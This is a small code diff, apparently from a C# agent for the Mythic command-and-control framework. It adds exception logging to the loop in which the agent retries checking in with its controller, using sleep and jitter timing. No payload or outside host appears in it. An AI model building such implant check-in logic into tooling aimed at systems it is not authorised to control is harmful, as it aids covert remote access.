@@ -351,7 +351,6 @@ That's our own",
             int maxMissedCheckins = 3;
             int missedCheckins = 0;
             CheckinResponse res = await this.CheckIn();
-
             //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
             while (res == null || res.status != "success")
             {
@@ -372,6 +371,7 @@ That's our own",
                 }
                 catch (Exception e)
                 {
+                    Console.WriteLine(e.ToString());
                 }
                 //Sleep before attempting checkin again
                 await Task.Delay(await Misc.GetSleep(this.MythicConfig.sleep, this.MythicConfig.jitter) * 1000);
